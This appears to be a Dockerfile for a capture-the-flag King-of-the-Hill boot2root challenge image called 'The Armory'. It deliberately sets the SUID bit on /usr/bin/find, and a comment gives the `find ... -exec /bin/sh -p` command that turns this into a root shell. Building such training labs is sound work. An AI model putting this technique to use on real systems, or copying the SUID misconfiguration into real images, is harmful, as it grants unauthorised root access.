# ctf-koth-boot2root-armory:latest -- boot2root KotH hill #1 "The Armory".
# Privesc: SUID find (GTFOBins). `find <path> -exec /bin/sh -p \; -quit` keeps
# the effective root uid -> root shell -> write /root/king.txt for full points.
FROM ctf-koth-boot2root-base:latest
RUN chmod u+s /usr/bin/find
